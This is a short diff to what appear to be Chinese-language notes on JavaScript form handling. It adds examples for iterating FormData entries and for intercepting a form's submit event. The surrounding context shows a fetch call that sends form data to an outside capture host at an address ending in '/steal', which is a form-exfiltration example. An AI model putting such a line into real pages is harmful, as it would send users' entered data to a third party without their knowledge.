@@ -312,6 +312,19 @@ fetch("https://oastify.com/steal", {
     mode: 'no-cors', 
     body: form_data_obj
 });
+
+// FormData.entries() 方法返回一个迭代器，该迭代器遍历 FormData 中包含的所有键/值对
+for (var pair of form_data_obj.entries()) {
+    var key = pair[0];
+    var value = pair[1];
+    ...
+}
+
+// 在表单设置事件监听器，修改默认行为到自定义函数，并阻止事件传递（阻止默认表单行为）
+document.getElementById("the_form_id").addEventListener("submit", function(e) {
+    自定义函数(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
+    e.preventDefault();
+});
 ```
 
 input 元素 value 值变化事件
